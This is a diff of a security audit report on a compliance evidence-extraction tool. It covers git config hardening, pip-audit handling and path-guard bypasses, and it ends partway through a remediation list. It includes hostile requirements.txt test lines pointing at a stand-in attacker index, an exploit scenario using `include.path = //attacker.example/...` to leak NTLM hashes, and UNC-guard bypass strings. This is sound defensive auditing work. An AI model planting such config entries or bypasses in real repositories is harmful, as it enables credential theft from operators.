@@ -1,600 +1,414 @@
 # SAST/DAST Security Scan Report
 ## LLMComplianceSkill — AI Compliance Evidence Collection Kit
 
-**Report Date**: 2026-10-11
+**Report Date**: 2026-10-12
 **Auditor**: Post-Commit Audit Skill (Claude Opus 5.5) — independent re-audit
-**Commit**: 9cd7272
+**Commit**: c6afa61
 **Branch**: fix/extractor-hostile-repo-and-evidence
 **Version**: 1.4.0
-**Audit Type**: POST-FIX re-audit (fix commit 9cd7272 over 304715e)
+**Audit Type**: POST-FIX re-audit round 2 (b439721, 9073c9a, c6afa61 over 13ff5a3)
 
 ---
 
-> ### Addendum: follow-up commits 3650b33 and 2acfc1e (self-verified by failing-first tests, not independently re-audited)
+> ### Addendum: round 3 at e368913 (62c0791, e368913) — SELF-VERIFIED
 >
-> After this re-audit, commit 3650b33 addressed the issues the 9cd7272 fix itself introduced:
+> **Not an independent re-audit.** An independent round-3 agent was started on 62c0791 but stopped
+> before running any probe, so it produced no verdict. Everything below was verified by the author
+> with failing-first tests (each test fails without its fix and passes with it). An independent
+> break-it pass on `git-sandbox.js` is recommended before release.
 >
-> - **LOW-03 → FIXED.** `gpg.ssh.allowedSignersFile` and `gpg.ssh.revocationFile` are pinned
->   to the operator's global git config (empty if unset), like the signing programs. Test
->   `a scanned repo cannot vouch for its own signatures` failed before the change (actual 1,
->   expected 0) and passes after it. The positive test, which uses an operator-trusted key
->   supplied through `GIT_CONFIG_GLOBAL`, still counts the commit as signed. On this repo,
->   `signedCommits` stays at 10.
-> - **MEDIUM-02 → PARTIALLY FIXED, still MEDIUM.** The two trust files plus `mailmap.file`
->   and `mailmap.blob` are now overridden. That removes every vector 9cd7272 added. Test
->   `a repo-configured mailmap.file is not read` failed before the change and passes after
->   it. **`include.path` / `includeIf` remain open**: git cannot turn off config includes
->   with `-c`. A full fix means running git with a controlled `GIT_CONFIG_*` environment
->   or rejecting repos whose `.git/config` contains `[include`.
-> - **Fail-open revocation (MEDIUM, found by the automated commit review of 3650b33) → FIXED in 2acfc1e.**
->   The pinning read only `--global` without `--includes`, so an operator's `gpg.ssh.revocationFile`
->   kept in system config or in an included file was replaced by an empty value, and revoked keys
->   counted as signed. It now reads `--global` then `--system`, both with `--includes`. Test
->   `a key revoked in an operator-included config does not count as signed` went RED 1 → GREEN 0.
-> - Suite at 2acfc1e: **167/167 pass** with pip-audit on PATH.
+> **Design change for MEDIUM-02.** The text guard (`git-config-guard.js`) is deleted. Its six bypasses
+> (G1–G6 below) showed that a checker cannot match git's config parser. `git-sandbox.js` instead runs git
+> with a private `GIT_DIR` holding a config the extractor writes, plus copies of HEAD/refs/packed-refs/shallow,
+> and points `GIT_OBJECT_DIRECTORY`, `GIT_INDEX_FILE` and `GIT_WORK_TREE` at the repository. git never
+> reads the repository's config, so includes, quoting and size tricks no longer matter. git-evidence,
+> package-evidence and sync-kb all use it, and `git()` refuses to run without it.
 >
-> Counts at 2acfc1e: Critical 0, High 0, Medium 1, Low 3, Info 8. **Verdict: PASS.**
+> | Item | Status at e368913 | Evidence |
+> |------|-------------------|----------|
+> | MEDIUM-02 G1 (>1 MiB config), G3 (quoting/continuation), G4 (one-line headers) | **FIXED (moot)** | Repo config never read: test `git reads neither the repo config nor its includes` |
+> | MEDIUM-02 G2 (mixed-slash UNC in gitdir/commondir) | **FIXED** | `isNetworkPath` resolves with `path.win32.resolve`; test covers 5 spellings |
+> | MEDIUM-02 G5 (subdirectory / bare repo) | **FIXED** | Refused: no `.git` at the given path; unit and end-to-end tests |
+> | MEDIUM-02 G6 (`objects/info/alternates`) | **FIXED** | Refused; test |
+> | Review of 62c0791: symlinks deep in the object store | **FIXED** (e368913) | Whole store walked; test `a symlinked loose object is refused` |
+> | Review of 62c0791: gitdir/commondir through an intermediate link to a share | **FIXED** (e368913) | `linksToNetwork()` lstat-walks components and link chains; test |
+> | Review of 62c0791: credentials leaked by truncate-then-redact; '@' in passwords | **FIXED** (e368913) | Redact first, match to last '@'; test |
+> | Review of 62c0791: `-r` include through an intermediate link | **FIXED** (e368913) | `isRepoFile` uses `linksToNetwork`; test spies on fs calls past the link |
+> | LOW-04 depth cap drops pins silently | **FIXED** | Gap `include nesting too deep`; test |
+> | LOW-06 pyproject/Pipfile unaudited with requirements.txt | **FIXED** | pyproject pins audited, ranges/Pipfile/Poetry recorded as gaps; test |
+> | INFO-12 hash-pinned requirements never audited | **FIXED** | Continuations joined, `--hash` stripped; test |
+> | INFO-13 sync-kb git lacks hardening | **FIXED** | sync-kb runs git in the sandbox |
+> | INFO-14 containment checks follow symlinks first | **FIXED** | `linksToNetwork` before `realpath` |
+> | INFO-15 world-map fix only downstream | **OPEN** until the upstream KB change merges (prepared, not pushed; with it `sync-kb --check` reports 0 changed) |
+> | INFO-10 Volta `npm-cli.js` layout | **OPEN** (INFO) |
+> | INFO-02 PII in evidence JSON | **OPEN** (by design; handling note) |
+>
+> Suite at e368913: **233/233 pass** with pip-audit on PATH.
+>
+> **Counts at e368913 (self-verified): Critical 0, High 0, Medium 0, Low 0, Info 3. Verdict: PASS.**
 
 ---
 
 ## Executive Summary
 
-Commit 9cd7272 claims to fix HIGH-01, MEDIUM-01, INFO-06, INFO-07 and INFO-08 from the
-prior report (written at 304715e). This re-audit tried to break each fix rather than
-confirm it. All five claimed fixes hold:
+Three commits claim to close every finding still open at 2acfc1e:
+- b439721 covers the extractors: MEDIUM-02, LOW-02, LOW-04, LOW-05, INFO-01, INFO-09, INFO-10 and INFO-11.
+- 9073c9a covers the HTML files and autofill: INFO-03, INFO-04 and INFO-05.
+- c6afa61 covers the supply chain (see `supply-chain-audit.md`).
 
-- **HIGH-01 is FIXED.** pip-audit 2.10.1 was run with the exact argv the extractor now
-  uses (`--format json --disable-pip --no-deps -r FILE`, cwd = the repo) against 16 hostile
-  `requirements.txt` variants. These covered editable and plain local paths, VCS URLs,
-  `--index-url`, `--extra-index-url`, `-i`, `--find-links`, `-r` and `-c` includes, direct
-  references and hashed lines. No `setup.py` marker was written. No request reached a
-  logging "attacker index" on 127.0.0.1. No module planted in the cwd was imported.
-- **MEDIUM-01 is FIXED.** Every process start in `tools/` now uses an absolute path. A
-  `git.exe` planted in the operator's cwd was ignored, and the extractor produced real
-  evidence.
-- **INFO-06, INFO-07 and INFO-08 are FIXED.** On this repository, `topAiModifiedFiles` is
-  populated and `signedCommits` is 10 (it was 0 before the fix). npm now resolves to
-  `npm.CMD`, which leads to a `npm-cli.js` started with `process.execPath`. A program named
-  in a repo-local `gpg.*program` key is still never run.
+This re-audit set out to break each fix, not to confirm it.
 
-The re-audit found five new issues and three new informational items:
+Results:
+- **Fixed and holding up under probing:** LOW-02, LOW-05, INFO-01, INFO-03, INFO-04, INFO-05, INFO-09 and INFO-11.
+- **MEDIUM-02 is PARTIALLY FIXED and stays MEDIUM.** The new `git-config-guard.js` catches the plain
+  forms: `[include]`, `[includeIf]`, and values starting with `//` or `\\`. It can still be bypassed in at
+  least six ways:
+  - It **fails open** on a config file larger than 1 MiB.
+  - It does not recognize mixed-separator UNC prefixes (`/\host`, `\/host`) or git quote-splitting
+    (`""//host`).
+  - It never inspects the config of a bare repository or of a parent repository that git finds by walking up.
+  - It does not inspect `objects/info/alternates`.
+- **LOW-04 is PARTIALLY FIXED.** Pins in a `-r` chain deeper than five levels are dropped silently, and the
+  evidence still reports `auditsRun: ["pip"]` with no gaps. This was reproduced end to end.
+- **INFO-10 is PARTIALLY FIXED.** `resolveBinary('git.exe')` now works, but `resolveNpm` still misses the
+  Volta image layout.
 
-- **MEDIUM-02 (new, partly pre-existing).** A hostile repo-local `.git/config` can still
-  make git, and now `ssh-keygen`, open a path the repo chooses. That includes Windows UNC
-  paths, which send the operator's NTLM credentials to a remote SMB host. The F4 hardening
-  covered only keys that run programs, not keys that name paths. `include.path` and
-  `mailmap.file` were already exploitable. 9cd7272 adds `gpg.ssh.allowedSignersFile` and
-  `gpg.ssh.revocationFile` as new vectors, because `ssh-keygen` now runs.
-- **LOW-03 (new, from the INFO-07 fix).** The same repo-local `gpg.ssh.allowedSignersFile`
-  can raise `signedCommits` from 0 % to 100 %.
-- **LOW-04 (new, from the HIGH-01 fix plus `auditsRun`).** A `-r` include, or path/URL
-  entries, hide pinned dependencies from pip-audit. The evidence then reports
-  `auditsRun: ["pip"]` with zero vulnerabilities.
-- **LOW-05 (new, pre-existing).** When npm resolves to the Volta shim, the scanned repo's
-  `package.json` `"volta"` key chooses which Node and npm versions run.
+New findings:
+- **LOW-06:** `pyproject.toml` and `Pipfile` dependencies go unaudited, with no gap recorded, whenever a
+  `requirements.txt` exists. Reproduced.
+- **INFO-12:** hash-pinned (`pip-compile --generate-hashes`) requirements are never audited. This fails closed.
+- **INFO-13:** `sync-kb.js` git hardening is incomplete.
+- **INFO-14:** the guard and the requirements reader follow symlinks before checking them.
+- **INFO-15:** the world-map fixes are not in the upstream knowledge base, so the next `sync-kb` run reverts
+  them. CI's `kb-sync-check` job already fails because of this.
 
-| Severity | Prior Audit (304715e) | This Audit (9cd7272) | Delta |
-|----------|----------------------|----------------------|-------|
-| Critical | 0                    | 0                    | —     |
-| High     | 1                    | 0                    | −1 (HIGH-01 fixed) |
-| Medium   | 1                    | 1                    | 0 (MEDIUM-01 fixed, new MEDIUM-02) |
-| Low      | 1                    | 4                    | +3 (LOW-02 open, new LOW-03/04/05) |
-| Info     | 8                    | 8                    | 0 (INFO-06/07/08 fixed, new INFO-09/10/11) |
-| **Total**| **11**               | **13**               | **+2**|
+| Severity | Prior (2acfc1e) | This Audit (c6afa61) | Delta |
+|----------|-----------------|----------------------|-------|
+| Critical | 0 | 0 | — |
+| High     | 0 | 0 | — |
+| Medium   | 1 | 1 | 0 (MEDIUM-02 partial, still open) |
+| Low      | 3 | 2 | −1 (LOW-02, LOW-05 fixed; LOW-04 partial; new LOW-06) |
+| Info     | 8 | 6 | −2 (INFO-01/03/04/05/09/11 fixed; INFO-10 partial; new INFO-12/13/14/15) |
+| **Total**| **12** | **9** | **−3** |
+
+The prior Low count of 3 means LOW-02, LOW-04 and LOW-05; LOW-03 was fixed in 3650b33. The prior Info count of 8
+means INFO-01, 02, 03, 04, 05, 09, 10 and 11.
 
 ### Prior-finding status
 
-| ID | Prior severity | Status at 9cd7272 |
+| ID | Prior severity | Status at c6afa61 |
 |---|---|---|
-| HIGH-01 pip-audit installs repo requirements (CWE-829) | HIGH | **FIXED** |
-| MEDIUM-01 bare `git` in git-evidence.js (CWE-427) | MEDIUM | **FIXED** |
-| LOW-02 quadratic YAML comment regex (CWE-1333) | LOW | **STILL OPEN** (not in scope of 9cd7272) |
-| INFO-01 pyproject regex ReDoS (CWE-1333) | INFO | **STILL OPEN** |
-| INFO-02 PII in evidence JSON (CWE-359) | INFO | **STILL OPEN** (by design, handling note) |
-| INFO-03 world-map `innerHTML` and no SRI (CWE-79/353) | INFO | **STILL OPEN** |
-| INFO-04 prototype-pollution sink in content-labeling (CWE-1321) | INFO | **STILL OPEN** |
-| INFO-05 `autofill.js --locale` unvalidated (CWE-22) | INFO | **STILL OPEN** |
-| INFO-06 `diff-tree -- <hash>` empties AI file list (CWE-754) | INFO | **FIXED** |
-| INFO-07 blank `gpg.program` zeroes `signedCommits` (CWE-754) | INFO | **FIXED** (the fix opens LOW-03 and widens MEDIUM-02) |
-| INFO-08 npm resolves to extensionless shim on Windows (CWE-754) | INFO | **FIXED** (see LOW-05 and INFO-10 for related residue) |
+| MEDIUM-02 repo config makes git open repo-chosen / UNC paths (CWE-73) | MEDIUM | **PARTIALLY FIXED — still MEDIUM** (guard bypasses below) |
+| LOW-02 quadratic YAML comment regex (CWE-1333) | LOW | **FIXED** (`ci-evidence.js:74-86`, linear `indexOf` scan) |
+| LOW-03 repo-local allowedSignersFile forges `signedCommits` | LOW | FIXED earlier (3650b33 / 2acfc1e); not re-tested this round |
+| LOW-04 pip-audit claims clean audit with hidden pins (CWE-754) | LOW | **PARTIALLY FIXED — still LOW** (depth cap drops pins silently) |
+| LOW-05 Volta shim chooses toolchain via package.json (CWE-15) | LOW | **FIXED** (`sanitizeManifest`, `package-evidence.js:267-285`) |
+| INFO-01 pyproject regex ReDoS (CWE-1333) | INFO | **FIXED** (`parsePyprojectDependencies`, single pass) |
+| INFO-02 PII in evidence JSON (CWE-359) | INFO | **OPEN** (by design; handling note) |
+| INFO-03 world-map `innerHTML` + no SRI (CWE-79/353) | INFO | **FIXED in this repo** (SRI independently recomputed; see INFO-15 for revert risk) |
+| INFO-04 prototype pollution sink, content-labeling (CWE-1321) | INFO | **FIXED** (`content-labeling.html:164-186`) |
+| INFO-05 `autofill.js --locale` unvalidated (CWE-22) | INFO | **FIXED** (`autofill.js:698-704`, regex + allow-list) |
+| INFO-09 `HASH_RE` rejects SHA-256 ids | INFO | **FIXED** (`git-evidence.js:81`) |
+| INFO-10 binary-resolution residue | INFO | **PARTIALLY FIXED** (extension names fixed; Volta `npm-cli.js` layout still missed) |
+| INFO-11 requirements symlink read outside repo (CWE-59) | INFO | **FIXED** (`isRepoFile` gate; see INFO-14 for the stat-before-check residue) |
 
-**Overall Result: PASS** (zero CRITICAL/HIGH; one MEDIUM and four LOW open; see Verdict)
+**Overall Result: PASS** (zero CRITICAL/HIGH; see Verdict for the conditions).
 
-Baseline facts for this audit:
-- `npm test` without pip-audit on PATH: **164 tests, 163 pass, 0 fail, 1 skipped** (the
-  live hostile-`setup.py` pip-audit test skips when pip-audit is absent).
-- `npm test` with `D:\tmp\pip-audit-venv\Scripts` prepended to PATH: **164 tests, 164 pass,
-  0 fail, 0 skipped**.
+Baseline facts:
+- `npm test` without pip-audit on PATH: **219 tests, 217 pass, 0 fail, 2 skipped**.
+- `npm test` with `D:\tmp\pip-audit-venv\Scripts` prepended to PATH: **219 tests, 219 pass, 0 fail, 0 skipped**.
 - Environment: Node v24.15.0 (Volta), git 2.55.0.windows.5, pip-audit 2.10.1, Windows 11.
 
 ---
 
 ## Scope and Method
 
-Reviewed: `git show 9cd7272` in full, and the resulting files
-`tools/extractors/git-evidence.js`, `tools/extractors/package-evidence.js`,
-`tools/extractors/resolve-binary.js`, `tools/extract-evidence.js`,
-`tests/regression-sast-2026-10-11.test.js` and `tests/extractor-hardening.test.js`.
-The pip-audit 2.10.1 sources were also read, specifically
-`pip_audit/_dependency_source/requirement.py` and `pip_requirements_parser.RequirementsFile.from_file`.
+Reviewed:
+- `git show` of b439721, 9073c9a and c6afa61 in full.
+- `tools/extractors/git-config-guard.js`, `package-evidence.js`, `git-evidence.js`, `ci-evidence.js` and
+  `resolve-binary.js`.
+- `tools/autofill.js`, `tools/sync-kb.js` and `tools/generate-sbom.js`.
+- The three world-map copies and `tools/interactive/content-labeling.html`.
 
-Dynamic probing was done in a session scratch directory only:
-- Marker-file payloads.
-- A logging HTTP server on 127.0.0.1:18765 that stood in for an attacker index or host.
-- `hostname.exe` renamed to `git.exe` / `ssh-keygen.exe` / `gpg.exe` as a benign planted binary.
-- A throwaway ed25519 key for SSH-signed test commits.
-- `//127.0.0.1/C$/…` admin-share paths to show that UNC paths are opened, without
-  contacting any remote host.
+Dynamic work was done only in the session scratchpad:
+- Crafted requirements trees were run through `collectPinnedRequirements` and through the full
+  `package-evidence.js` with pip-audit 2.10.1. pip-audit contacted only PyPI/OSV.
+- An npm-audit workspace probe was run.
+- The three CDN assets were downloaded into a new empty directory and hashed, never executed.
+- The upstream knowledge-base world map was fetched for comparison.
+- `sync-kb.js --check` was run against a fake knowledge base.
 
-No third-party host was contacted except PyPI/OSV (by pip-audit itself) and the npm
-registry (by the project's own `npm test` npm-audit regression test). No code in the
-repository was modified.
+**Not tested dynamically:** the git-config-guard bypasses. They were established by code reading and by
+string-level checks of the guard's own `isUncPath` classifier and Node's `path.win32.resolve`. No probe made git
+or Windows open a UNC path in this round. Severity reflects that each bypass follows from documented git or
+Windows path semantics, not from an observed SMB connection.
 
----
-
-## Verification of Prior Fixes (in 9cd7272)
-
-### HIGH-01 — FIXED
-
-`package-evidence.js:939-941` `pipAuditArgs()` returns
-`['--format','json','--disable-pip','--no-deps','-r', reqFile]`, used at `:962`. pip-audit
-is skipped when there is no `requirements.txt` (`:955-960`).
-
-Code path in pip-audit 2.10.1: when `disable_pip` and `no_deps` are both set,
-`_collect_from_files` calls `_collect_preresolved_deps` and returns *before* the
-`VirtualEnv(...)`/`pip install` branch. `RequirementsFile.from_file` is called with
-`include_nested=False`, so `-r`/`-c` includes are never opened. URL, path and editable
-requirements become `SkippedDependency` entries.
-
-Hostile `requirements.txt` cases, each run with the extractor's exact argv and cwd = the
-case directory. Every case also had `json.py`, `typing_extensions.py` and
-`sitecustomize.py` marker modules in the cwd.
-
-| Case | Content | pip-audit result | setup.py ran | Index/URL fetched | cwd module imported |
-|---|---|---|---|---|---|
-| A | `-e ./local` | skipped "could not deduce package version" | no | — | no |
-| B | `./local` | skipped | no | — | no |
-| C | `git+http://127.0.0.1:18765/evil.git#egg=evilpkg` | skipped "URL requirements cannot be pinned" | no | no request | no |
-| N | `-e git+http://127.0.0.1:18765/evil.git#egg=evilpkg` | skipped | no | no request | no |
-| D | `--index-url http://127.0.0.1:18765/simple` + `evilpkg==1.0` | "not found on PyPI" (queried PyPI, not the index) | no | no request | no |
-| E | `--extra-index-url …` + `evilpkg==1.0` | same as D | no | no request | no |
-| O | `--trusted-host` + `-i …` + pinned with marker | same as D | no | no request | no |
-| J | `--find-links http://127.0.0.1:18765/links` + pin | same as D | no | no request | no |
-| F | `-r other.txt` (other.txt = `./local`) | `dependencies: []` (include not followed) | no | — | no |
-| G | `-c constraints.txt` (= `./local`) + `requests==2.31.0` | audited requests only | no | — | no |
-| H | `evilpkg==1.0 @ file:///…/local` | invalid specifier, exit 1, no JSON | no | — | no |
-| H2 | `evilpkg @ file:///…/local` | skipped | no | — | no |
-| K | `evilpkg @ http://127.0.0.1:18765/evilpkg-1.0.tar.gz` | skipped | no | no request | no |
-| L | `./local/evilpkg-1.0.tar.gz` | skipped | no | — | no |
-| I | hashed `requests==2.31.0 --hash=…` + `./local --hash=sha256:00` | audited requests, path skipped | no | — | no |
-| M | `requests==2.31.0` (control) | 6 vulns found | — | — | no |
-
-Result: the marker directory was empty and the 127.0.0.1 logger received 0 requests.
-pip-audit's documented "`-r` ≡ `pip install -r`" behavior no longer applies with these
-flags. The code-execution and attacker-fetch path is closed. Residual evidence-integrity
-issues from these semantics are reported as **LOW-04**.
-
-### MEDIUM-01 — FIXED
-
-`grep execFileSync|spawn|execFile tools/` finds exactly four exec sites:
-
-| Site | Binary |
-|---|---|
-| `extract-evidence.js:20` | `process.execPath` |
-| `git-evidence.js:134` (`operatorGitConfig`) | `gitBinary()` |
-| `git-evidence.js:176` (`git()`) | `gitBinary()` |
-| `package-evidence.js:190` (`runTool`) | rejects any non-absolute `file` (`:185`) |
-
-`gitBinary()` (`git-evidence.js:108-114`) uses `resolveBinary('git')` and fails closed.
-`resolveBinary` skips relative PATH entries (`resolve-binary.js:30`). No `spawn`/`exec`
-with a shell remains. Reproduction: with a renamed `hostname.exe` planted as `git.exe`,
-`ssh-keygen.exe` and `gpg.exe` in the cwd, `node git-evidence.js --repo D:\LLMComplianceSkill`
-returned real evidence (`signedCommits: 10`, populated `topAiModifiedFiles`).
-
-`operatorGitConfig` (`git-evidence.js:131-144`) runs `git config --global --get <key>` with
-cwd `os.tmpdir()`. `--global` reads only `$HOME/.gitconfig` or `GIT_CONFIG_GLOBAL`, which
-belong to the operator. The scanned repo cannot reach this call:
-- The cwd is not the repo.
-- `includeIf "gitdir:"` and `"onbranch:"` conditions in the global file are evaluated
-  against the tmpdir context.
-- `GIT_DIR`/`GIT_CONFIG*` environment variables are the operator's.
-- On POSIX, a `/tmp/.git` planted by another local user is refused by git's
-  `safe.directory` ownership check.
-
-Bare-name pins were also tested. With the operator's global `gpg.ssh.program = ssh-keygen`
-(a bare name) and an `ssh-keygen.exe` planted in the scanned repo's worktree, Git for
-Windows still ran the real `ssh-keygen` (`signedCommits` 3/3). Git's own lookup does not
-search the cwd. Falling back to `resolveBinary('ssh-keygen')` returned
-`C:\Program Files\Git\usr\bin\ssh-keygen.EXE`, an operator PATH entry, which is safe.
-
-Repo-local program keys were tested in one run. `gpg.program`, `gpg.openpgp.program`,
-`gpg.ssh.program`, `gpg.x509.program` and `gpg.ssh.defaultKeyCommand` each pointed to a
-marker `.cmd`. The extractor ran none of them. A plain unhardened `git log --format=%G?`
-did run the repo's `gpg.ssh.program`, which confirms the probe was valid.
-`defaultKeyCommand` is a signing-only key and is never consulted during verification.
-
-**However**, repo-local *path-valued* keys still reach git and `ssh-keygen`. See
-MEDIUM-02 and LOW-03.
-
-Remediation item 2 of the prior MEDIUM-01 (a trusted `cwd` in `runExtractor`) was not
-applied. Since every binary is now absolute, this is no longer needed for MEDIUM-01.
-
-### INFO-06 — FIXED
-
-`git-evidence.js:507` now passes
-`['diff-tree','--no-commit-id','--name-only','-r','--root', hash, '--']`. Every value
-pushed to `aiCommitHashes` passes `isHash()` first (`:466-467`, the only push is at
-`:479`). `HASH_RE` is `/^[0-9a-f]{7,40}$/i` (`:79`), so a value can never start with `-`.
-A full 40-hex string is resolved as an object ID, not a ref. On this repo,
-`topAiModifiedFiles` is populated (`tools/autofill.js` 10, `SKILL.md` 9, …).
-Related issue: the 40-character cap rejects SHA-256 object IDs (INFO-09).
-
-### INFO-07 — FIXED
-
-Signing programs are pinned to the operator's global value or to the PATH default
-(`git-evidence.js:123-155`). If neither exists, the pin is blank, which fails safe.
-`signedCommits` on this repo is 10 (it was 0 before). The regression test "a commit with
-a valid SSH signature counts as signed" passes. The new attack surface this opens is
-reported as LOW-03 and MEDIUM-02.
-
-### INFO-08 — FIXED
-
-`resolve-binary.js:23-26` tries only PATHEXT extensions on win32. Under Volta-launched
-Node, `resolveBinary('npm')` returns
-`…\Volta\tools\image\npm\12.2.0\bin\npm.CMD`. `resolveNpm` then falls back to
-`dirname(process.execPath)\node_modules\npm\bin\npm-cli.js`, which exists, and the
-regression test asserts `auditsRun: ['npm']`. Checks for regressions:
-- No caller passes a name that includes an extension. `resolveBinary('git.exe')` now
-  returns `null` (it found the file before), which is harmless today (INFO-10).
-- nvm-windows (`C:\nvm4w\nodejs\npm.cmd` + `node_modules\npm\bin\npm-cli.js`) matches the
-  `.cmd` branch.
-- A Volta `npm.EXE` shim is returned as-is and run directly. That was also true before
-  9cd7272, but it has a repo-influence side effect (LOW-05).
+No code in the repository was modified.
 
 ---
 
-## Active Findings
+## Verification of Fixes
 
-### [MEDIUM-02] Repo-local `.git/config` path keys are not neutralized: git and ssh-keygen open repo-chosen paths, including Windows UNC (NTLM credential leak) — NEW (partly pre-existing; widened by 9cd7272)
-**CWE**: CWE-73 (External Control of File Name or Path), impact CWE-200 / CWE-522 (credential hash exposure)
-**OWASP**: A05:2021 Security Misconfiguration
-**Files**:
-- `tools/extractors/git-evidence.js:94-100` (`GIT_HARDENING` lists only program-executing keys)
-- `git-evidence.js:123-155` (9cd7272 makes `ssh-keygen` actually run)
-- Sinks at `git-evidence.js:695` (`%G?`) and `:867`, `:896`, `:904` (`%aN`/`%aE`/`%cE` honor mailmap)
-- Every `git()` call (`include.path`)
-**Status**: Open
+### MEDIUM-02 — PARTIALLY FIXED (still MEDIUM)
 
-```js
-const GIT_HARDENING = [
-  '-c', 'core.fsmonitor=false', '-c', 'core.hooksPath=' + os.devNull,
-  '-c', 'diff.external=', '-c', 'protocol.allow=never', '-c', 'log.showSignature=false'
-];  // no override for include.path, mailmap.file/blob, gpg.ssh.allowedSignersFile/revocationFile
-```
+`checkRepoGitConfig` (`git-config-guard.js:77-99`) runs before the first git call in `git-evidence.js:1071-1078`
+(exit 2) and before `isGitTracked` in `package-evidence.js` (`lockFileCommitted: null`). The plain cases are
+refused:
+- `[include]`, `[ include ]`, `[INCLUDE]` and `[includeIf "…"]` headers at the start of a line, including with
+  leading whitespace or a BOM. JS `\s` matches U+FEFF.
+- `key = //host/…`, `key = \\host\…`, `"\\\\host\\…"` and `\\?\UNC\…` values.
+- A `.git` symlink, which `lstat` reports as neither a file nor a directory.
+- A UNC `gitdir:` or `commondir` written in those same forms.
 
-**Description**: The F4 threat model treats a scanned repo's `.git/config` as hostile. The
-hardening neutralizes keys that make git *run* a program. It does not neutralize keys that
-make git, or a program git starts, *open a path*. On Windows, opening a
-`//host/share/…` path makes an SMB connection that authenticates with the operator's
-NTLM credentials. That leaks a crackable or relayable NetNTLMv2 hash to the host the repo
-names. The WebDAV redirector is a fallback when the WebClient service is running.
+Remaining bypasses, each of which lets git read config or object paths the guard never approved:
 
-Vectors reproduced with `//127.0.0.1/C$/…` (a local admin share, so no remote host was
-contacted):
-
-| Repo-local key | Who opens it | Reproduced | Introduced |
+| # | Bypass | Where | Basis |
 |---|---|---|---|
-| `include.path=//host/share/x` | git itself, on **every** `git()` call | Included file's `[mailmap] file=` took effect; mapped name appeared in evidence | pre-existing |
-| `mailmap.file=//host/share/x` | git (`%aN`/`%aE` in author and committer extraction) | Mapped author `Mapped Via UNC` appeared in evidence JSON | pre-existing |
-| `gpg.ssh.allowedSignersFile=//host/share/x` | `ssh-keygen -Y find-principals/verify` during `%G?` | `signedCommits` 0 → 3 when the allowed-signers file was served via the UNC path | **9cd7272** (before it, `gpg.ssh.program=` was blank and ssh-keygen never ran) |
-| `gpg.ssh.revocationFile=//host/share/x` | `ssh-keygen` during `%G?` | Same mechanism (a local revocation path changed the result to 0 G) | **9cd7272** |
+| G1 | **Fail-open on size**: `readSmall` returns `null` for any file over 1 MiB, and the loop `continue`s. A 1 MiB+ `.git/config` that is mostly comments, with an `[include]` anywhere in it, is reported `ok: true`. git reads it normally. | `git-config-guard.js:35`, `:84-85` | code reading |
+| G2 | **Mixed-separator UNC**: `UNC_RE` matches only `\\` and `//`. Windows and Git for Windows treat any two leading separators as UNC. The guard returns `false` for `/\srv\share` and `\/srv/share`, and `path.win32.resolve` turns both into `\\srv\share\`. This applies to config values, the `.git` file's `gitdir:` and `commondir`. For `gitdir:`/`commondir`, the guard then calls `statSync` on the resolved UNC path itself (`readSmall`). | `git-config-guard.js:24`, `:55-56`, `:65-67` | string-level test (output below) |
+| G3 | **git value quoting and continuation**: git concatenates quoted and unquoted parts and joins a value that ends in `\` with the next line. `path = ""//srv/share` and `path = "/"/srv/share` both yield `//srv/share`, but the guard sees a leading `"` followed by `"` or `/` and returns `false`. A value continued onto the next line is never tested, because only text after the first `=` on the *same* line is checked. | `git-config-guard.js:92-93` | string-level test; git config grammar |
+| G4 | **Header position**: `INCLUDE_RE` is anchored to the start of the line. git's parser accepts another section header immediately after `]` on the same line (`[core][include] path = …`). The UNC test uses the first `=` on the line, so a subsection that contains `=` (`[x "="][include] path = //srv/s`) hides the value too. | `git-config-guard.js:25`, `:89-93` | code reading against git's `config.c` grammar; not executed |
+| G5 | **Wrong repository inspected**: the guard looks only at `<repo>/.git`. If `--repo` is a **bare repository** (its `config` sits directly in the directory), or a **subdirectory of a repository** (git walks up to the parent's `.git`), the guard returns `ok: true` (`:80`). git then reads an unchecked config. `-C <repo>` is used with no `GIT_CEILING_DIRECTORIES` and no `--git-dir`. | `git-config-guard.js:46-50`, `:80`; `git-evidence.js:194` | code reading; git discovery semantics |
+| G6 | **Non-config path files**: `objects/info/alternates` lists extra object directories, including UNC paths, and git opens them on every object read (`log`, `diff-tree`). The guard does not read it. | `git-config-guard.js:59-70` | code reading; gitrepository-layout(5) |
 
-**Exploit scenario**: An operator is handed a repository as a directory or archive (not a
-fresh clone, which would not carry `.git/config`). It contains one SSH-signed commit and
-`.git/config` entries such as `include.path = //attacker.example/s/c`. Running
-`extract-evidence.js --repo <dir>` on Windows makes git connect to `attacker.example:445`
-and send the operator's NetNTLMv2 response. The actual remote NTLM exchange was not
-exercised, in line with the no-third-party-host rule. That Windows authenticates to a UNC
-SMB target on open is standard OS behavior.
+String-level evidence for G2/G3 (guard classifier vs. Windows normalization):
+```
+mixedA       guard says UNC: false  win32.resolve -> \\srv\share\
+mixedB       guard says UNC: false  win32.resolve -> \\srv\share\
+quotedEmpty  guard says UNC: false  win32.resolve -> \\srv\share\
+quotedSplit  guard says UNC: false  win32.resolve -> \\srv\share\
+plainFwd     guard says UNC: true   win32.resolve -> \\srv\share\
+plainBack    guard says UNC: true   win32.resolve -> \\srv\share\
+```
 
-**Preconditions**:
-- Windows.
-- The repo is delivered with its `.git` directory. This is the same precondition as CS-F4,
-  which was rated MEDIUM.
-- Outbound SMB (or WebDAV) to the attacker host is allowed.
-- For the `gpg.ssh.*` vectors, at least one SSH-signed commit in the scan window, which
-  the attacker controls.
+Mailmap, the gpg trust files and the signing programs stay pinned by `GIT_HARDENING` and
+`getSigningOverrides`, so the only remaining vectors are the ones above. None of these keys is overridden by
+`-c`: `core.worktree`, `core.attributesFile`, `core.excludesFile` and include files. Any of them reached through
+G1–G5 is opened by git.
 
 **Remediation**:
-1. Add path-key overrides to `GIT_HARDENING`:
-   - `-c mailmap.file= -c mailmap.blob= -c log.mailmap=false`, and use `%an`/`%ae`/`%cn`/`%ce`.
-   - `-c gpg.ssh.allowedSignersFile=<operator global value or os.devNull>`.
-   - `-c gpg.ssh.revocationFile=<operator global value or empty>`, both read with
-     `operatorGitConfig`.
-2. Command-line `-c` cannot stop an `include.path`/`includeIf` that lives inside the repo's
-   own config. Before the first git call, read `.git/config` with
-   `git config --local --no-includes --list` (or parse it as text). Refuse, or mark the
-   evidence `untrusted-config`, when it contains `include.`/`includeIf.` sections or any
-   value that starts with `//` or `\\`.
-3. Alternatively, scan a private copy that has a clean config:
-   - Copy `objects/`, `refs/`, `packed-refs` and `HEAD` into a temp dir and write a fresh
-     minimal `config`.
